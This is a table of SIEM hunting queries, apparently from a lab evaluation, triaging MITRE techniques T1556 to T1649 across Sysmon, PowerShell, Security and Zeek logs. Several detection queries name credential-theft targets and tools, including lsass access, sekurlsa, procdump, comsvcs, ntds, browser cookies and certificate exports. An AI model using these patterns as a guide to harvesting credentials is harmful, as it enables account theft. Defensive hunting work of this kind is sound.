| q-98be20117d | triage T1556 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Lsa\\\\* OR registry.path:*\\\\Lsa*) AND NOT process.executable:*lsass.exe", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "registry.pat… | 0 |  |
| q-09220c2aef | triage T1556 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:15:00.000Z\" \| KEEP @timestamp, host.name, user.name, win.Path, win.ScriptBlo… | 232 |  |
| q-875d8d319d | triage T1556 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:*Lsa*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "registry.path", "win.Details", "user.name"], "size": 30, "sort": "asc"} | 3 | F35, F36, F37 |
| q-7241159477 | triage T1556 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwEmW7n"} | None |  |
| q-32c0978e3b | triage T1556 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwEmm4I"} | None |  |
| q-aa169eef45 | triage T1556 step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND user.name == \"pbeesly\" \| KEEP @timestamp, win.ScriptBlockText, _id, _index \| SORT @timestamp ASC \| LIMIT 6… | 60 |  |
| q-ec50db6bbf | triage T1556 step 7 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*Sysinternals* OR process.command_line:*Sysinternals* OR process.executable:*procdump* OR process.executable:*psexec*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 8 | F35 |
| q-79342e2cb2 | triage T1556 step 8 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND user.name == \"pbeesly\" AND @timestamp >= \"2020-05-02T03:01:51.000Z\" \| KEEP @timestamp, win.ScriptBlockText… | 40 | F35 |
| q-b7fa47cb5a | triage T1556 step 8 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.pid:2976 OR process.pid:7720 OR process.command_line:*wsmprovhost* OR process.command_line:*Invoke-Command* OR process.command_line:*Enter-PSSession*)", "time_from": null, "time_to": null, "fiel… | 2 | F35, F36 |
| q-23b468f7cc | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-c5e382294a | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-9089c77275 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-d87ec74873 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-f2951058ed | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAx"} | None |  |
| q-fb0fee7420 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSxb"} | None |  |
| q-833c07bbfe | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-68cb376f0d | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-fbcc6690af | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw468x"} | None |  |
| q-612068a1f4 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAz"} | None |  |
| q-e9a55a0e06 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JBe"} | None |  |
| q-9875ee4288 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAz"} | None |  |
| q-60e6c5ab46 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDl0_c"} | None |  |
| q-f5bc40061d | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-546958fe91 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItzyZYWV3"} | ERROR |  |
| q-27d4f14798 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItzyZYWXW"} | ERROR |  |
| q-fc87951b40 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAs"} | None |  |
| q-817cc9703e | triage T1556 step 10 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "user.name", "process.executable", "win.ServiceName", "win.ServiceFileName", "message"], "size": 10, "sort": "asc"} | 5 | F40 |
| q-65340f6c75 | triage T1557 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*dhcp* OR process.command_line:*ipconfig* OR process.command_line:*netsh*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.datase… | 5 | F45 |
| q-41ebaa3c65 | triage T1557 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "destination.ip", "destination.port", "win.De… | 66 |  |
| q-cf05fdf632 | triage T1557 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None | F45 |
| q-6be720fb5f | triage T1557 step 2 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:3 AND win.TargetUserName:pbeesly", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.TargetUserName", "win.LogonType", "win.IpAddress", "win.W… | 20 | F43 |
| q-fe3ea960a3 | triage T1557 step 3 | search | {"dataset": "windows.security", "query": "event.code:4697", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.ServiceName", "win.ServiceFileName", "win.ServiceAccount", "win.ServiceStartType"], "size": 25, "sort": "asc… | 23 |  |
| q-2e67a6b60f | triage T1557 step 3 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND (destination.port == 445 OR destination.port == 139 OR destination.port == 137 OR destination.port == 138) \| KEEP @timestamp, source.ip, destination.ip, destination.p… | 60 | F43 |
| q-83752ce04c | triage T1557 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"dns\" OR event.action == \"notice\" \| KEEP @timestamp, event.action, source.ip, destination.ip, dns.question.name, dns.answers, dns.response_code, zeek.note, zeek.msg, _id, _ind… | 55 | F43, F44 |
| q-87fb7c5aa6 | triage T1557 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| LIMIT 60"} | 60 |  |
| q-db8b8cc635 | triage T1557 step 5 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE destination.ip == \"192.168.0.5\" OR source.ip == \"192.168.0.5\" OR destination.ip == \"192.168.0.4\" \| KEEP @timestamp, event.action, source.ip, source.port, destination.ip, destination.port, z… | 500 |  |
| q-03b09e2c11 | triage T1557 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.ip == \"192.168.0.4\" OR destination.ip == \"192.168.0.5\") \| KEEP @timestamp, host.name, user.name, process.executable, destination.ip, destination… | 40 | F42, F44 |
| q-ef512c1d11 | triage T1557 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwIqjKK"} | None | F42 |
| q-47f560ccf1 | triage T1557 step 6 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == \"6\" OR event.code == \"11\" OR event.code == \"16\" OR event.code == \"1\" OR event.code == \"10\" OR event.code == \"20\" OR event.code == \"32\" OR event.code == \"55\" … | 45 |  |
| q-7c2ec3f836 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwIqjKK"} | None |  |
| q-00c765d8f0 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-e711995493 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWV3"} | None |  |
| q-423c9fa406 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylr4ud"} | None |  |
| q-fa3b378187 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovU"} | None |  |
| q-f14ac33852 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrouG"} | None |  |
| q-237afb49ed | triage T1557 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqO44j"} | None |  |
| q-574adcbd9c | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovu"} | None |  |
| q-0dc64cdb7d | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrot8"} | None |  |
| q-89bf858b96 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ9Y"} | None |  |
| q-ea67157d63 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None |  |
| q-ea0163f188 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpp7sSn"} | None |  |
| q-5035fefa53 | triage T1558 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000 OR win.GrantedAccess:0x1400… | 33 | F46, F47, F48 |
| q-ece611fdff | triage T1558 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"kerberos\" \| KEEP @timestamp, source.ip, destination.ip, zeek.request_type, zeek.client, zeek.service, zeek.success, zeek.error_msg, zeek.cipher, zeek.forwardable, zeek.renewabl… | 35 | F46, F47, F48, F49, F50 |
| q-ce533ee685 | triage T1558 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None | F51 |
| q-58f70e1de3 | triage T1558 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None | F52 |
| q-e1a6b228c4 | triage T1558 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND (process.executable LIKE \"*powershell*\" OR process.executable LIKE \"*wsmprovhost*\" OR process.executable LIKE \"*cmd.exe*\" OR process.executable LIKE \"*rundll32… | ERROR |  |
| q-6bad4ad234 | triage T1558 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == 4104 \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp"} | ERROR |  |
| q-eef7410169 | triage T1558 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.executable LIKE \"*powershell*\" OR process.executable LIKE \"*wsmprovhost*\" OR process.executable LIKE \"*cmd.exe*\" OR process.executable LIKE \"*rund… | 37 | F52 |
| q-31b073892d | triage T1558 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp"} | 414 | F51 |
| q-3f41c61630 | triage T1558 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND @timestamp >= \"2020-05-02T03:01:30Z\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp"} | 375 |  |
| q-5b99043e52 | triage T1558 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.pid IN (\"2976\", \"7720\") \| KEEP @timestamp, host.name, user.name, process.pid, process.executable, process.command_line, process.parent.executable, _i… | ERROR |  |
| q-1e1cb4a1b9 | triage T1558 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.pid IN (2976, 7720) \| KEEP @timestamp, host.name, user.name, process.pid, process.executable, process.command_line, process.parent.executable, _id, _inde… | 2 |  |
| q-5e5b165795 | triage T1558 step 6 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:01:30Z\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _ind… | 108 | F51 |
| q-518f56bf76 | triage T1558 step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND @timestamp >= \"2020-05-02T03:06:42Z\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp"} | 215 | F51 |
| q-9ce8c07f9d | triage T1558 step 7 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4672\" \| KEEP @timestamp, host.name, user.name, win.TargetUserName, win.SubjectUserName, win.PrivilegeList, _id, _index \| SORT @timestamp"} | 212 | F46, F47 |
| q-167ca03071 | triage T1558 step 8 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code == \"4104\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp"} | 11 | F52 |
| q-86820e7e75 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotQ"} | None |  |
| q-88b4ae0dd4 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotP"} | None |  |
| q-8e7921ad89 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkady05"} | None |  |
| q-1980e6f328 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAu"} | None |  |
| q-a5ec9a339c | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM6"} | None |  |
| q-6f31f88214 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovz"} | None |  |
| q-2bae2498d1 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-49fa585344 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxXRNx"} | None |  |
| q-0da6a29b37 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovy"} | None |  |
| q-641b1163c9 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp5"} | None |  |
| q-de9b6bf452 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkbfEQ2"} | None |  |
| q-034e3fb9a1 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrov7"} | None |  |
| q-bb8b8cdcfc | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotT"} | None |  |
| q-9afe21d714 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrotQ"} | None |  |
| q-ef8e3d3595 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp3"} | None |  |
| q-fb6c3c4d22 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz8vIp4"} | None |  |
| q-9f29d8ef83 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-4c4d54b264 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwHqJZm"} | None |  |
| q-fea06121fe | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-ec16711952 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-9423eb2038 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopf"} | None |  |
| q-e1baa3b265 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-63da8bae85 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw468x"} | None |  |
| q-c9ffb22a35 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-708df8452b | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz-ho2U"} | ERROR |  |
| q-82381fecc3 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDlSQT"} | None |  |
| q-e9e0aa301b | triage T1558 step 10 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItz-ho2U"} | ERROR |  |
| q-d63772dce1 | triage T1558 step 10 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None | F51 |
| q-1412e224db | triage T1606 step 1 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.TargetUserName", "win.TargetServerName", "win.ProcessName", "win.IpAddress", "win.SubjectUserName", "win.Sub… | 15 | F53, F55 |
| q-33376ef767 | triage T1606 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.GrantedAccess:\"0x101541\" OR win.GrantedAccess:\"0x101441\" OR win.GrantedAccess:\"0x103800\" OR win.GrantedAccess:\"0x103801\" OR win.GrantedAccess:\"0x1014c0\")", "time_from": null, "time_to": n… | 41 | F53 |
| q-5d89d74734 | triage T1606 step 2 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.GrantedAccess:\"0x1fffff\"", "time_from": null, "time_to": null, "size": 20, "sub_field": "win.TargetImage"} | 1131 |  |
| q-24ec3a6520 | triage T1606 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*psexec* OR process.command_line:*psexec* OR process.executable:*PSEXESVC* OR process.command_line:*PSEXESVC*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.nam… | 4 |  |
| q-39cecdcb93 | triage T1606 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*python* OR process.executable:*3aka3* OR process.command_line:*3aka3* OR process.command_line:*python*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "u… | 11 | F54 |
| q-4f952f52f0 | triage T1606 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*python*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.SourceImage", "win.TargetImage", "win.GrantedAccess", "win.CallTrace"], "size": 20,… | 178 |  |
| q-abc61a48cd | triage T1606 step 4 | search | {"dataset": "windows.sysmon", "query": "host.name:nashua.dmevals.local AND (process.executable:*python* OR win.Image:*python* OR win.TargetFilename:*python* OR win.SourceImage:*python*) AND NOT event.code:10", "time_from": null, "time_to": null, "fields": ["@t… | 512 |  |
| q-13433bdb20 | triage T1606 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*Cookie* OR win.TargetFilename:*cookie* OR win.TargetFilename:*Login*Data* OR win.TargetFilename:*Token* OR win.TargetFilename:*.json)", "time_from": null, "time_to": null, "fields":… | 4 |  |
| q-c43ec5c2cb | triage T1606 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (process.executable:*python* OR win.Image:*python*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "destination.ip", "destination.port", "w… | 348 |  |
| q-52e52c951f | triage T1606 step 5 | search | {"dataset": "windows.sysmon", "query": "host.name:scranton.dmevals.local AND event.code:1 AND (process.command_line:*lsass* OR process.command_line:*sekurlsa* OR process.command_line:*procdump* OR process.command_line:*comsvcs* OR process.command_line:*ntds* O… | 3 |  |
| q-12c29585e9 | triage T1606 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None | F54 |
| q-8689e30ab6 | triage T1606 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None | F54 |
| q-e8213c5f0b | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-5319b8adda | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-3ad5539289 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLbBWk"} | None |  |
| q-f1323478fc | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLbBWk"} | None |  |
| q-af0007df44 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpFTsz_"} | None |  |
| q-866a6604a3 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-707038fc5d | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-be9ef0358f | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-dd6c1f4dfd | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-28cd7fd885 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-dfff682c0b | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-602df2660e | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-c8cc5b8649 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-dc2902790d | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsc9wOe"} | None |  |
| q-cafad0d5d3 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsQ2v-T"} | None |  |
| q-9604abdc33 | triage T1649 step 1 | search | {"dataset": "windows.security", "query": "event.code:4657 AND win.ObjectName:*SystemCertificates*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.ObjectName", "win.ObjectValueName", "win.NewValue", "win.OldValue", "win.ProcessN… | 1 |  |
| q-705df51b6e | triage T1649 step 1 | search | {"dataset": "windows.security", "query": "event.code:4768", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.TargetUserName", "win.IpAddress", "win.PreAuthType", "win.TicketEncryptionType", "win.TicketOptions", "win.Status", "win.… | 14 | F58 |
| q-3a8b5548af | triage T1649 step 2 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None | F57 |
| q-bc2bc894f5 | triage T1649 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE TO_LOWER(process.command_line) LIKE \"*certutil*\" OR TO_LOWER(process.command_line) LIKE \"*.pfx*\" OR TO_LOWER(process.command_line) LIKE \"*.p12*\" OR TO_LOWER(process.command_line) L… | 0 |  |
| q-e55d8a1041 | triage T1649 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*.pfx\" OR TO_LOWER(win.TargetFilename) LIKE \"*.p12\" OR TO_LOWER(win.TargetFilename) LIKE \"*.cer\" OR TO_LOWER(win.Target… | ERROR |  |
| q-0093cec2bb | triage T1649 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| STATS c = COUNT(*) BY process.executable, host.name \| SORT c ASC \| LIMIT 60"} | 60 |  |
| q-b27944307d | triage T1649 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*.pfx\" OR TO_LOWER(win.TargetFilename) LIKE \"*.p12\" OR TO_LOWER(win.TargetFilename) LIKE \"*.cer\" OR TO_LOWER(win.Target… | 2 | F57 |
| q-c9852f94a5 | triage T1649 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| STATS c = COUNT(*) BY process.executable, host.name \| SORT c DESC \| LIMIT 25"} | 25 |  |
| q-9f45b88d4d | triage T1649 step 5 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None | F56 |
| q-8bfeb4e0da | triage T1649 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.executable LIKE \"*powershell.exe\" \| KEEP @timestamp, host.name, user.name, process.executable, process.command_line, process.parent.executable, _id, _i… | 12 |  |
| q-4513a9bfe0 | triage T1649 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQb3a"} | None | F56 |
| q-db663d4cbe | triage T1649 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:04:00.000Z\" AND @timestamp <= \"2020-05-02T03:06:00.000Z\" \| KEEP @timestamp, process… | 40 | F56 |
| q-284a2c7547 | triage T1649 step 7 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4886\",\"4887\",\"4888\",\"5058\",\"5059\",\"4662\",\"4909\",\"4910\",\"4899\",\"4900\") \| KEEP @timestamp, host.name, event.code, win.ObjectName, win.ObjectType, win… | 22 |  |
